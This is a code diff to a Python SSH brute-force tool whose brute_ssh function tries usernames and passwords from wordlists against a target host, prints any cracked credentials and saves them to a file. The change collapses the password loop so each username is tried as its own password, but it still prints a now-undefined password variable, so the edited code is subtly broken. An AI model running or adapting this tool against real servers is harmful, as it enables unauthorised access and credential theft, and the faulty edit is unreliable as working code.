@@ -62,19 +62,18 @@ def brute_ssh(hostname, port='22', username_list='', password_list=''):
 
 
     for u in usernames:
-       for p in passwords:
-            count += 1
-            print('[-] trying ' + str(count) + ' data...\tu=' + u + '\tp=' + p)
-            time.sleep(0.1)
-            try:
-                ssh.connect(hostname=hostname, port=port, username=u, password=p)
-                print('[!] Cracking success!')
-                print('[*] username=>' + u)
-                print('[*] password=>' + p)
-                f.writelines(hostname+"  "+u+"  "+p+"\n")
-                break
-            except:
-                pass
+        count += 1
+        print('[-] trying ' + str(count) + ' data...\tu=' + u + '\tp=' + p)
+        time.sleep(0.1)
+        try:
+            ssh.connect(hostname=hostname, port=port, username=u, password=u)
+            print('[!] Cracking success!')
+            print('[*] username=>' + u)
+            print('[*] password=>' + u)
+            f.writelines(hostname+"  "+u+"  "+u+"\n")
+            break
+        except:
+            pass
 
 
 # 载入字典文件，返回一个一维list
